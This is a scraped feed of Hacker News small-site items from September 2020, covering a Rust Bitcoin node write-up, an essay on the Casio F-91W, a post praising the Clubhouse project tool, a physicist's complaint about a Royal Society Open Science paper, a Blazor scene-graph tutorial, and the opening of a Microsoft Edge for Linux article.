<li>We need to interrupt the miner from the P2P thread when a new block is received so that it starts building on the latest chain</li>
</ul>
<p><a href="https://doc.rust-lang.org/std/sync/mpsc/" rel="nofollow">MPSC Channels</a> were used to publish blocks and transactions as the occurred on the node. Mutexes were used to keep the mempool and peer list thread safe while they are being updated.</p>
<h2 id="config">Config</h2>
<p>A simple config file has been implemented to allow multiple nodes with different configurations to be run on the same machine.</p>
<pre><code>rpc_port = 2337
tcp_port = 2338
web_port = 2339
data_dir = "node2_data"
miner_enabled = true
bootstrap_node = "127.0.0.1:1338"
</code></pre>
<p>Notice that the bootstrap node‚Äôs address is defined here.</p>
<h2 id="still-not-complete">Still not complete</h2>
<p>It turns out that building a full robust implementation is extremely time consuming. While we have something here that is valuable for demonstration purposes, there are still a few strides to reach a reliable network. Some of these are:</p>
<ul>
<li>Difficulty adjustment - Currently, difficulty is hardcoded in the software. The bitcoin network adjusts the difficulty such that regardless of how much hash power the network is churning, a block is mined roughly every 10 minutes.</li>
<li>Fault tolerant consensus - Currently our node assumes that blocks come in a consistent fashion and in order. To be truly byzantine fault tolerant, the software needs to handle the nuances of consensus. For example, if there is a fork, the node needs to be able to pick the heaviest chain.</li>
<li>Operating network on public internet - There is an assumption that all nodes in the network are reachable on an unrestricted basis. In reality, firewalls and routers play a big role on what kind of communications the node is capable of making.</li>
</ul>
<h2 id="web-ui">Web UI</h2>
<p>There is a web interface that runs by default on port <code>1339</code>. Using this interface, you can send transactions and explore the blockchain.</p>
<h2 id="closing-thoughts">Closing thoughts</h2>
<p>This was a fun project. It was disappointing to discontinue it before there was an operational public network. It‚Äôs a testament to the meticulous care that has gone into the Bitcoin software.</p>

            </div>
        </div></div>]]>
            </description>
            <link>https://monokh.com/posts/bitcoin-from-scratch-part-3</link>
            <guid isPermaLink="false">hacker-news-small-sites-24593854</guid>
            <pubDate>Fri, 25 Sep 2020 20:37:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Guide to Satellite Structures]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24593841">thread link</a>) | @kartikkumar
<br/>
September 25, 2020 | https://blog.satsearch.co/2020-09-25-cubesat-structures-and-pocketqube-structures-on-the-global-space-marketplace | <a href="https://web.archive.org/web/*/https://blog.satsearch.co/2020-09-25-cubesat-structures-and-pocketqube-structures-on-the-global-space-marketplace">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://blog.satsearch.co/2020-09-25-cubesat-structures-and-pocketqube-structures-on-the-global-space-marketplace</link>
            <guid isPermaLink="false">hacker-news-small-sites-24593841</guid>
            <pubDate>Fri, 25 Sep 2020 20:35:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Casio F-91W and the role of technology]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24593716">thread link</a>) | @tpaschalis
<br/>
September 25, 2020 | https://tpaschalis.github.io/casio-f91w/ | <a href="https://web.archive.org/web/*/https://tpaschalis.github.io/casio-f91w/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Here‚Äôs a picture of my Casio F-91W.</p>

<center>
<img src="https://tpaschalis.github.io/images/casio-f91w.png">
</center>

<p>It‚Äôs not fancy, expensive or impressive, but it‚Äôs one of my most beloved material possessions (as in, I‚Äôd be a little bummed if it was lost or stolen).</p>

<p>I‚Äôve had it for around a year now, and the impulse to get one came from <a href="https://dvt.name/2019/06/03/hacking-the-casio-f-91w-to-handle-1000-psi/">this</a> article about hacking one to handle 1000+ PSI (or ~700m deep). It‚Äôs not the most fashionable accessory, has been touted a <a href="https://reaperfeed.com/how-did-the-casio-f91w-become-a-terrorist-icon/">terrorist icon</a>, but as David mentioned above, it‚Äôs probably the only watch worn by both Obama and Osama so it‚Äôs got <em>that</em> going for it.</p>

<p>Jokes aside, I feel that it is an excellent piece of hardware, and the reason I love it is that it embodies many of the things I actually love about technology, and how it can empower humanity.</p>

<ul>
  <li>
    <p>Great Design<br>
It‚Äôs actually not that common to find modern interfaces with <em>three</em> buttons. Most toasters or fridges nowadays have more. I‚Äôm not sure whether it‚Äôs state of the art, but I feel that Dan Norman would be happy to use one.</p>
  </li>
  <li>
    <p>Simplicity, Discoverability <br>
Its entire functionality can fit in <del>four</del> <a href="https://twitter.com/tpaschalis_/status/1309453292011958273">three tweets</a>, and the manual (not that you need one, but available <a href="https://www.instructionsmanuals.com/sites/default/files/2019-06/Casio-qw415_587_590_593_595_596-en.pdf">here</a>) fits in one page, including pictures. The physical interface and ‚Äòsoftware‚Äô, if you can call it that, are seamlessly connected, and I believe anyone could figure how it works even if she hasn‚Äôt seen a digital watch in her life.</p>
  </li>
  <li>
    <p>Less is More<br>
There is the place for a fourth button, but designers said <em>scratch that</em>, we don‚Äôt need it.</p>
  </li>
  <li>
    <p>Affordability<br>
Its price (around ‚Ç¨10 or less for clones), makes it accessible for nearly everyone in the globe.</p>
  </li>
  <li>
    <p>Robustness, Build Quality<br>
Battery life is about 7 years. The watch itself doesn‚Äôt feel too cheap, is water-resistant, and I don‚Äôt ever think about taking it off when getting my hands dirty.</p>
  </li>
  <li>
    <p>Disassembly and Repairability<br>
It‚Äôs quite easy to disassemble the watch; there are no constructs in place to actively discourage you from doing so. Want to replace the battery? Just remove 4 screws on the back! Want to silence the beeping sound? Easy as well. Don‚Äôt like the strap? Grab your tools! This simplicity also contributes to its resiliency and trustworthiness.<br>
People have built <a href="http://casiomod.club/">businesses</a> and communities around <a href="https://www.reddit.com/r/casio/comments/f9ugyu/the_bestworst_casio_f91w_modifications_awards/">modding</a> F91Ws; from adding NFC and SD-card holders, to changing the light color or inverting the screen colors.</p>
  </li>
  <li>
    <p>Timelessness <br>
Introduced back in 1989, it has inspired a whole family of variants and still produces over 3 million pieces per year. Œôt‚Äôs not that often that digital devices maintain their relevance 30+ years in the future.</p>
  </li>
  <li>
    <p>Limitations<br>
Sure, it‚Äôs not perfect. It doesn‚Äôt adjust itself for leap years, the light could be brighter, the stopwatch can only count up to one hour, and its accuracy is ¬±30 seconds per month (~6 minutes per year). But there aren‚Äôt any ‚Äòclever‚Äô workarounds to ‚Äòhide‚Äô or make up for them; they‚Äôre part of the deal.</p>
  </li>
</ul>

<h2 id="so-what">So, what?</h2>

<p>I‚Äôm not sure if you agree, but these are qualities that are hard to find condensed into one product.</p>

<p>I long for the day we can construct F91W-equivalent smartphones, power generators or vehicles for everyone on the planet, and wish for more F91W-like command-line prompts or websites.  I‚Äôm talking about tools that are more than fashion statements of brag material, but useful in their own right without having to constantly remind us of their relevance.</p>

<p>But that‚Äôs what technology is about, right? Combining art (techne) and skill (-logia) to build things that can make our world a better place‚Ñ¢.</p>

<h2 id="notes">Notes</h2>
<p><a href="https://en.wikipedia.org/wiki/Casio_F-91W">Wikipedia entry</a></p>

<p>Various articles/discussions :<br>
https://news.ycombinator.com/item?id=23971045<br>
https://news.ycombinator.com/item?id=20079488<br>
https://www.bbc.com/news/magazine-13194733<br>
https://www.martinkaptein.com/blog/10-reasons-casio-f-91w-best-watch/</p>

<!--
Tweets

~~~
The Casio F91W is amazing in many ways. 

One of the most interesting is how its _entire_ functionality can fit in two^H^H three tweets.

Just remember, there are 3 buttons counting anti-clockwise (L), (C) and (A).

~~~
Button (C) always cycles through 'modes'.
- Timekeeping mode; (L) turns the light on. (A) toggles between 12/24-hours view. Long press (A) for an authenticity check.
- Alarm mode; (L) highlights fields (hour/minute) to set, and (A) advances them.
~~~
In alarm mode, press (C) to toggle the alarm, the hourly beep or both. Long pressing (A) sound-tests the alarm.
- Setup Mode; (L) highlights fields to set, from hours, minutes, month, day-of-month, day of week. Use (A) to advance the fields or long press (A) to advance quickly 
~~~
- Stopwatch mode; Press (C) to start/stop the stopwatch. If the timer is stopped, (A) clears the timer. 
If the timer is running, (A) records laptimes, while the timer continues running in the background.
If you stay idle for a minute you'll return in timekeeping mode.
~~~

-->


  </div></div>]]>
            </description>
            <link>https://tpaschalis.github.io/casio-f91w/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24593716</guid>
            <pubDate>Fri, 25 Sep 2020 20:19:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tools We Love: Clubhouse]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24593659">thread link</a>) | @gk1
<br/>
September 25, 2020 | https://www.onsecurity.co.uk/blog/tools-we-love-clubhouse/ | <a href="https://web.archive.org/web/*/https://www.onsecurity.co.uk/blog/tools-we-love-clubhouse/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <figure>
    <img src="https://www.onsecurity.co.uk/blog/tools-we-love-clubhouse/clubhouse_screenshot_1.png" alt="Clubhouse Screenshot of Development Epics"> 
</figure>

<p>When we do our regular ‚Äútools we love‚Äù series here @ OnSecurity, we usually talk about hacking tools our pen-testers use for, er, hacking.</p>
<p>I wanted to change it up a bit this time around, and talk about Clubhouse, a tool we use as a business a LOT.</p>
<p>If you haven‚Äôt heard of it Clubhouse is a workflow or project management platform, designed for software teams.</p>
<p>I would describe it as a ‚Äòpyramid‚Äô system where you view a different layer of detail depending on what your role is, and the lower, more detailed layers feed up to the layers above them.</p>
<p>These layers are the core concept of Clubhouse (I love accidental alliteration (holy crap I just did it again!)). Briefly, they are as follows:</p>
<ul>
<li>Project - long-term or permanent projects (i.e. back-end dev, UX etc etc)</li>
<li>Epic - large body of work which will deliver a new feature or component. Managers, product owners etc work at this level</li>
<li>Story - The small components that make up a feature, this is the level the developers work at. Stories can be marked as a ‚Äòfeature‚Äô, ‚Äòbug‚Äô or ‚Äòchore‚Äô.</li>
</ul>
<p>Stories make up Epics, and Epics are assigned to a project.</p>
<p>The reason I wanted to blog about it is that Clubhouse has genuinely had a massive impact on the way we work here at OnSecurity. It has literally made this a nicer and better place to work, which I don‚Äôt often find myself saying about a B2B platform (the OnSecurity platform being the other exception of course! :P)</p>
<h4 id="so-why-do-we-love-clubhouse-so-much">So why do we love Clubhouse so much?</h4>
<p>We (like probably a lot of other early-stage companies) used to use Trello for working through stories and pushing out features.</p>
<p>As we grew, Trello boards quickly became messy and disorganized, we frequently found ourselves ditching entire boards and starting new ones in an attempt to regain some organisation, but the situation kept repeating itself and getting worse.</p>
<p>(<strong>Disclaimer</strong>: nothing against Trello, it‚Äôs a great tool and brilliantly implemented, it just wasn‚Äôt meeting our needs as we grew and there were more people doing more roles.)</p>
<p>Clubhouse, to me, is a bit like Trello, only it‚Äôs in 3D, and on Steroids.</p>
<p>It tells people at different layers of the organisation only what they need to know, when they need to know it. As a product person, I operate pretty much only at the ‚ÄúEpic‚Äù level - I don‚Äôt need to know the details of the individual stories the developers are working on, I just see the lovely ‚Äú% complete‚Äù bar on my epics creeping up as the devs push stuff out.</p>
<p>We‚Äôve found this a super-effective way of ‚ÄúGetting Sh*t Done‚Äù‚Ñ¢ in product, and it just makes me feel good that I can check-in and see what‚Äôs happening without having to bother the developers. I switch off the laptop a happier man in the evenings.</p>
<h4 id="two-ps-in-a-pod-productivity-and-prioritisation">Two P‚Äôs in a Pod (Productivity and Prioritisation)</h4>
<p>Owners are assigned to everything within Clubhouse, so inherent accountability is introduced, which has had a very positive impact on productivity. The whole company
can monitor what‚Äôs happening at the level and detail they care about. There are no features dropping off the face of the earth or not getting done for unexplained reasons. The communication tools built into Clubhouse mean developers can inherently keep managers updated at all times, for example by tagging in comments on stories. You can assign ‚Äòdue by‚Äô dates to stories or epics, however we rarely do this to be honest, unless it‚Äôs an urgent bug.</p>
<p>Another nice feature is the ability to easily prioritise epics (and therefore stories), so that when the goals or priorities or the organisation change, you can feed that down to developers by dragging and dropping Epics. That is epic.</p>
<h4 id="pushing-the-boat-out">Pushing the boat out</h4>
<p>The product team found the platform worked so well that we pushed it out to other areas of the business. It is now used heavily by Sales, Marketing and (soon) Customer Success.</p>
<p>Taking marketing as an example, for each blog post we create an Epic. The epic is made up of stories consisting of the steps involved in researching, writing, publishing, publicising and measuring the success of the post. These steps are repeatable, so we just recycle this epic for each new blog post.</p>
<p>The marketing manager only cares about the completeness of the Epic, the stories are each assigned to the people best placed to carry them out, and Sh*t Gets Done‚Ñ¢.</p>
<figure>
    <img src="https://www.onsecurity.co.uk/blog/tools-we-love-clubhouse/clubhouse_screenshot_2.png" alt="Clubhouse Screenshot of Marketing Epics"> 
</figure>

<h4 id="conclusion">Conclusion</h4>
<p>Well, it‚Äôs probably fairly obvious from above that I‚Äôd strongly recommend you at least give Clubhouse a try - they now have a free tier so you can use a very full set of features, completely free, for up to ten users. There‚Äôs a tonne of other features I haven‚Äôt mentioned in this post, but hopefully you get the message. Try it out anyway and see what you think - we haven‚Äôt looked back!</p>
<p>What tools do you use in your company that have had a big impact on your operations, culture or even margins?</p>
<p><strong>Note</strong>: OnSecurity is in no way affiliated with Clubhouse (bar the obvious fact that we use it religiously). My friend Al now works there as a designer or illustrator or something (check out his <a href="https://dribbble.com/alzer81">Dribbble</a>), but I don‚Äôt like him anywhere near enough to publicise his employers for no reason. I‚Äôm writing about Clubhouse here because we like to tell people about tools that are going to help them achieve their goals.</p>

        </div></div>]]>
            </description>
            <link>https://www.onsecurity.co.uk/blog/tools-we-love-clubhouse/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24593659</guid>
            <pubDate>Fri, 25 Sep 2020 20:11:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Verified Programming in F*: A Tutorial]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24593646">thread link</a>) | @jstrieb
<br/>
September 25, 2020 | http://fstar-lang.org/tutorial/ | <a href="https://web.archive.org/web/*/http://fstar-lang.org/tutorial/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://fstar-lang.org/tutorial/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24593646</guid>
            <pubDate>Fri, 25 Sep 2020 20:10:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Deafening Silence of the Royal Society Open Science Journal]]>
            </title>
            <description>
<![CDATA[
Score 73 | Comments 15 (<a href="https://news.ycombinator.com/item?id=24593465">thread link</a>) | @mathgenius
<br/>
September 25, 2020 | https://www.iqoqi-vienna.at/blog/article/dishonesty-in-academia-the-deafening-silence-of-the-royal-society-open-science-journal-on-an-accept/ | <a href="https://web.archive.org/web/*/https://www.iqoqi-vienna.at/blog/article/dishonesty-in-academia-the-deafening-silence-of-the-royal-society-open-science-journal-on-an-accept/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Florin Moldoveanu researches the foundation of quantum mechanics with emphasis on quantum mechanics reconstruction and solving the measurement problem. After getting his PhD in theoretical physics at the University of Maryland at College Park in 1999, he pursued a career in industry. Three years ago he started the transition back from industry to academia and became an adjunct professor at George Mason University. His earlier graduate student research papers in theoretical physics received 267 citations to date.</p><hr><p>More than two years ago, on February 26<sup>th</sup> 2018, I was contacted by the <strong>Royal Society Open Science Journal</strong> to referee a submitted manuscript. Two prior referees had accepted the paper and two had rejected it, and I was the tiebreaker. The manuscript, <em>Quantum Correlations are Weaved by the Spinors of the Euclidean Primitives</em> by Joy Christian, basically claims that Bell‚Äôs theorem is incorrect. If true, this would be a game changer in the foundation of quantum mechanics. Bell‚Äôs theorem shows that it is impossible to construct a local realistic model of the theory.</p><p>Bell‚Äôs result is an impossibility proof; it attracts such passion as the impossibility of perpetual motion machines that were so popular some 100 years ago. A manuscript claiming the invention of a working perpetual motion device, proof that Earth is flat (yes, there is such a thing as an annual conference of Flat-Earth-ers), or that the sun circles Earth would be rejected by any respectable journal right away.</p><p>So, what if someone managed to ‚Äúdisprove‚Äù Bell‚Äôs theorem and, better yet, to publish that ‚Äúdiscovery‚Äù? This would create lots of debates and excitement ‚Äì certainly, notoriety and free publicity for the journal who published your claim. In other words, good business.</p><p>But who is claiming to have ‚Äúdisproven‚Äù Bell theorem? Enter Joy Christian, who has been asserting this claim for 13 years. It was debunked by many scientists and scientific panels over the years, yet Christian is not having any of it. Basically, he alleges to have found a method for obtaining the quantum correlation of a Bell pair of particles, by using a Bell ‚Äúloophole‚Äù. In the no-mans-land at the intersection of physics, mathematics, and philosophy, experts in all three fields are scarce. Christian‚Äôs ‚Äòmethod‚Äô is based on a mathematical error, which is ultimately adding apples and oranges, but the error is hard to spot if you are not a genuine expert in geometric algebra. Add to this the language and structure of a well-written physics paper and you might convince an unsuspecting referee to approve your manuscript.</p><p>I had found Christian‚Äôs mistake again in the manuscript and I recommended to reject the paper. Certain that it would never be published, I went about my daily business. Imagine my surprise when I heard Christian had somehow managed to publish his nonsense. I thought this impossible; the vote had been 3 to 2 for rejection. I checked and found that indeed, the paper had gotten accepted after submitting a revision. <strong>However,</strong><strong>I was not contacted by the journal to review the revision. </strong>I started contacting colleagues who had to deal with Joy‚Äôs claims before, and together with Philippe Grangier, Richard Gill, Howard Wiseman, Brukner ƒåaslav, Gregor Weihs, and Scott Aaronson, in a letter to the journal on July 28<sup>th</sup> 2018, we asked that the article be withdrawn:</p><p><em>Dear Editor-in-Chief,</em></p><p><em>We are writing to you about the publication of the paper ‚ÄúQuantum Correlations are weaved by the spinors of the Euclidean primitives‚Äù by Joy Christian in your journal on May 30 2018&nbsp;</em><a href="http://rsos.royalsocietypublishing.org/content/5/5/180526" target="_blank"><em>http://rsos.royalsocietypublishing.org/content/5/5/180526</em></a></p><p><em>The result of this paper conflicts with an established scientific fact (Bell‚Äôs theorem) well known in the foundations of quantum physics and a basis of modern quantum information science; moreover, the subject of recent high-profile experiments (‚Äúloophole free tests of Bell‚Äôs theorem‚Äù). The paper contains numerous errors in elementary algebra, calculus, and logic. The manuscript was rejected by three of the five reviewers,&nbsp;but the editorial process as stated to the reviewers by your journal was not followed:&nbsp;the manuscript was accepted without informing the reviewers&nbsp;and giving them a chance to rebut the misleading statements made by the author (see review history on the link above).</em></p><p><em>The claims made by the author are well known from 2007 and they were disproven in the past (</em><a href="https://fqxi.org/community/forum/topic/1577" target="_blank"><em>https://fqxi.org/community/forum/topic/1577</em></a><em>&nbsp;). From time to time Joy Christian attempts to publish his faulty claims and recently a similar paper was withdrawn by Annals of Physics&nbsp;</em><a href="https://www.sciencedirect.com/science/article/pii/S0003491616300975" target="_blank"><em>https://www.sciencedirect.com/science/article/pii/S0003491616300975</em></a></p><p><em>The journal did extend an invitation to write a rebuttal paper but stated that Joy Christian would be a reviewer to the rebuttal. This is not an acceptable course of action from an ethical point of view because it legitimizes scientific dishonesty on behalf of Joy Christian who is well aware of the issues with his arguments for more than 10 years and yet continues to obfuscate the truth.</em></p><p><em>Considering this, we are respectfully asking your journal to withdraw the paper.</em></p><p><em>Sincerely,</em></p><p><em>Florin Moldoveanu&nbsp;- George Mason University (reviewer 5)</em></p><p><em>Richard Gill ‚Äì Leiden University</em></p><p><em>Howard Wiseman ‚Äì Griffith University (reviewer 3)</em></p><p><em>Scott Aaronson - University of Texas</em></p><p><em>Philippe Grangier - Institute of Optics, Charles Fabry Laboratory</em></p><p><em>Brukner Caslav - IQOQI - Institute for Quantum Optics and Quantum Information Vienna</em></p><p><em>Gregor Weihs ‚Äì Innsbruck University</em></p><p>This was about two years ago. We kept asking for updates, and when not stonewalling us, the journal kept pushing one roadblock after another.</p><p>The <strong>Royal Society Open Science Journal had more than two years to get their act together. By now, their silence speaks louder than words.</strong></p><p>It is unconscionable that instead of putting extra checks in place for authors with a history of inaccurate publications, the journal violated their own peer review policy and chose to maintain a faulty paper instead of withdrawing it.</p><p>We gave the journal the benefit of the doubt for two years. The passing of time made it clear that the decision to maintain the faulty paper is no accident and no mistake.</p><p>Perhaps this is a symptom of a larger systemic problem with open journals who are paid by the authors to get their papers (usually rejected elsewhere) published. When your salary and livelihood depend on the people you are supposed to enforce rules upon, the temptation to bend those rules is high.</p><p>I grew up in a former communist country of the eastern bloc. At the time of communism, a rule supposed to be enforced by the traffic police was that if you pay for a traffic ticket on the spot, you will be charged with half the fine. You might guess that most officers pocketed that money. The rule only solidified endemic corruption.</p><p>In our case, the author is well known for making the same incorrect argument over and over again. However, <strong>the root of the problem seems to be with the journal</strong>. After all, had they followed their own policy, the problem would not have arisen in the first place. And in case the mistake was genuine (as sometimes mistakes do happen), is two years enough time to get the record straight? It makes me wonder: just how often did the editors turn a blind eye to publication issues to secure revenue? <strong>Is it really a good idea that those in charge of rule enforcement are financially dependent on the rule violators? </strong></p></div></div>]]>
            </description>
            <link>https://www.iqoqi-vienna.at/blog/article/dishonesty-in-academia-the-deafening-silence-of-the-royal-society-open-science-journal-on-an-accept/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24593465</guid>
            <pubDate>Fri, 25 Sep 2020 19:51:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blazor GameDev ‚Äì part 10: the Scene Graph]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24593336">thread link</a>) | @davideguida
<br/>
September 25, 2020 | https://www.davideguida.com/blazor-gamedev-part-10-the-scene-graph/ | <a href="https://web.archive.org/web/*/https://www.davideguida.com/blazor-gamedev-part-10-the-scene-graph/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Hi All! Here we go with part 10 of our <strong>Blazor 2d GameDev</strong> series. Today we‚Äôre going to talk about an extremely important tool that can greatly improve game entities management: the <strong>Scene Graph</strong>.</p><p>This is an example, just to give you an idea of what is going to be the result:</p><div><figure><img width="450" height="180" src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20450%20180%22%3E%3C/svg%3E" data-src="https://i2.wp.com/www.davideguida.com/wp-content/uploads/2020/09/blazor-2d-gamedev-scene-graph.gif?resize=450%2C180&amp;ssl=1" alt="" data-recalc-dims="1"></figure></div><p>You can also check it<a rel="noreferrer noopener" href="https://mizrael.github.io/BlazorCanvas/BlazorCanvas.Example9/" target="_blank"> in your browser </a>before moving on.</p><p>In <a href="https://www.davideguida.com/blazor-gamedev-part-9-finite-state-machine/" target="_blank" rel="noreferrer noopener">our last episode,</a> we introduced Finite State Machines. They greatly help cleaning up the mess of procedural code that very often may arise when writing a game. But still, we are adding all our Game Objects to the Game without any kind of relationship. What if we want to model a Solar System?</p><h4>Or, more formally: what if we want to represent parent-child relationships, with the state of the parent influencing the state of its children.</h4><p>There‚Äôs a long list of different applications we can have for a Scene Graph, for example handling collisions. Imagine a first-person shooter game: when a bullet is fired against an enemy, there‚Äôs no need to check for collisions on an arm if the bullet didn‚Äôt collide with the whole body bounding box.</p><p>Let‚Äôs start by defining a very simple <a href="https://github.com/mizrael/BlazorCanvas/blob/develop/BlazorCanvas.Example9/Core/SceneGraph.cs" target="_blank" rel="noreferrer noopener">SceneGraph class</a>, something like this:</p><pre data-enlighter-language="csharp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">public class SceneGraph
{
	public SceneGraph()
	{
		Root = new GameObject();
	}

	public async ValueTask Update(GameContext game)
	{
		if (null == Root)
			return;
		await Root.Update(game);
	}
	
	public GameObject Root { get; }
}</pre><p>The Root node is a simple empty GameObject, that will act as a ‚Äúglobal container‚Äù of all our entities. This will be just a starting point for a simple game. It is missing a lot of functionalities (eg. multiple roots, search, removal), but will work for now. Also, keep in mind that in a game you already have the general structure of the entity tree. A different case would be in an editor, but let‚Äôs leave it for another time.</p><p>The next thing we have to do is update the <a href="https://github.com/mizrael/BlazorCanvas/blob/develop/BlazorCanvas.Example9/Core/GameObject.cs" target="_blank" rel="noreferrer noopener">GameObject class </a>and add parent/child relationship:</p><pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">public class GameObject 
{
	private readonly IList&lt;GameObject&gt; _children;

	public GameObject()
	{
		_children = new List&lt;GameObject&gt;();
	}
	
	public IEnumerable&lt;GameObject&gt; Children =&gt; _children;
	public GameObject Parent { get; private set; }

	public void AddChild(GameObject child)
	{
		if (!this.Equals(child.Parent))
			child.Parent?._children.Remove(child);

		child.Parent = this;
		_children.Add(child);
	}
}</pre><p>We‚Äôll also need to make few changes to its <em>Update()</em> method:</p><pre data-enlighter-language="csharp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">public async ValueTask Update(GameContext game)
{
	foreach (var component in this.Components)
		await component.Update(game);

	foreach (var child in _children)
		await child.Update(game);
}</pre><p>The idea is to first update all the Components and then move to the Children collection. The flow is basically a <a href="https://en.wikipedia.org/wiki/Depth-first_search#Vertex_orderings" target="_blank" rel="noreferrer noopener">preorder DFS</a>, which is fine most of the time. Another option would be using a <a href="https://en.wikipedia.org/wiki/Breadth-first_search" target="_blank" rel="noreferrer noopener">BFS</a>, but that would make the code a bit more complex to follow.</p><p>Now in our initialization code all we have to do now is instantiating the <strong>Scene Graph</strong> instance and start adding nodes to it:</p><pre data-enlighter-language="csharp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">var sceneGraph = new SceneGraph();

var player = new GameObject();
var sceneGraph.Root.AddChild(player);

var enemies = new GameObject();
var enemy1 = new GameObject();
enemies.AddChild(enemy1);
var enemy2 = new GameObject();
enemies.AddChild(enemy2);
var sceneGraph.Root.AddChild(enemies);</pre><p>Now, in our Solar system game, we want the planets to rotate around the sun and satellites to do the same around planets instead. Using a <strong>Scene Graph </strong>this becomes extremely easy by updating the <a href="https://github.com/mizrael/BlazorCanvas/blob/develop/BlazorCanvas.Example9/Core/Components/TransformComponent.cs" target="_blank" rel="noreferrer noopener">TransformComponent class</a>:</p><pre data-enlighter-language="csharp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">public class TransformComponent : BaseComponent
{
	private Transform _local = Transform.Identity();
	private Transform _world = Transform.Identity();

	public override async ValueTask Update(GameContext game)
	{
		_world.Clone(ref _local);
		
		if (null != Owner.Parent &amp;&amp; Owner.Parent.Components.TryGet&lt;TransformComponent&gt;(out var parentTransform))
			_world.Position = _local.Position + parentTransform.World.Position;
	}

	public Transform Local =&gt; _local;
	public Transform World =&gt; _world;
}</pre><p>We basically inherit the parent‚Äôs <em>world </em>position and simply use it as offset to the <em>local </em>position of the current Game Object.</p><p>That‚Äôs all for today! Next time will see how to improve the asset loading code.</p><p>Ciao!</p></div></div>]]>
            </description>
            <link>https://www.davideguida.com/blazor-gamedev-part-10-the-scene-graph/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24593336</guid>
            <pubDate>Fri, 25 Sep 2020 19:35:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Collaborative Start Up Guide]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24593208">thread link</a>) | @fainir
<br/>
September 25, 2020 | https://www.sumbli.com/p/OThHJlEZqt/How-to-Build-a-Company-(Startup--Lifestyle--Social-Impact) | <a href="https://web.archive.org/web/*/https://www.sumbli.com/p/OThHJlEZqt/How-to-Build-a-Company-(Startup--Lifestyle--Social-Impact)">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.sumbli.com/p/OThHJlEZqt/How-to-Build-a-Company-(Startup--Lifestyle--Social-Impact)</link>
            <guid isPermaLink="false">hacker-news-small-sites-24593208</guid>
            <pubDate>Fri, 25 Sep 2020 19:19:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft Edge Browser Coming to Linux]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24593131">thread link</a>) | @flipchart
<br/>
September 25, 2020 | https://build5nines.com/microsoft-edge-browser-coming-to-linux/ | <a href="https://web.archive.org/web/*/https://build5nines.com/microsoft-edge-browser-coming-to-linux/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-content">
		<div>
		<div id="content-area">
			<div id="left-area">
											<article id="post-30102">
											<div>
							

						<p><img alt="" src="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=48&amp;d=identicon&amp;r=g" srcset="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=96&amp;d=identicon&amp;r=g 2x" height="48" width="48" loading="lazy" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p><img src="https://i1.wp.com/build5nines.com/wp-content/uploads/2020/09/Microsoft_Edge_Browser_Coming_to_Linux_Featured_Image.jpg?fit=900%2C506&amp;ssl=1" alt="Microsoft Edge Browser Coming to Linux" width="900" height="506">
												</p></div> <!-- .et_post_meta_wrapper -->
				
					<div>
					
<p>Microsoft has been increasingly supporting Linux, and the latest application coming to Linux is the Microsoft Edge web browser. About a year ago we saw <a href="https://build5nines.com/microsoft-teams-first-office-app-linux/">Microsoft Teams released as the first Office app for Linux</a>, and now we‚Äôre seeing Microsofts Edge web browser too.</p>



